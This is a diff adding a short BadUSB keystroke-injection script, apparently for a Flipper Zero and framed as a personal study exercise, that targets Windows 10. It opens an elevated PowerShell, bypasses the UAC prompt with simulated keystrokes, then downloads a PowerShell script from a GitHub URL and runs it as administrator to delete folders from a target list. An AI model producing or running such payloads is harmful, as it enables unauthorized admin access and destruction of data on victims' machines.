@@ -1,0 +1,20 @@
+REM Script #6: Deleting Folders
+REM Desc: Deleting Folders based on a target list. Learnt how to use SHIFT TAB and download and run a Powershell script from GitHub!
+REM I want to try doing a short script such that it won't take that much space.
+REM Author: Ainsley Cabading
+REM Meant for Windows 10
+
+REM Running Powershell as an Admin
+GUI r
+DELAY 200
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 500
+SHIFT TAB
+DELAY 200
+ENTER
+DELAY 1500
+
+REM Downloading the deleteFile.ps1 from GitHub and running it
+STRING New-Object System.Net.WebClient | %{$_.DownloadFile('https://github.com/aenslei/flipperZero-studies/blob/main/Powershell/deleteFile.ps1', 'deleteFile.ps1'); Start-Process powershell.exe -Verb runAs -ArgumentList "-File deleteFile.ps1"}, exit
+ENTER
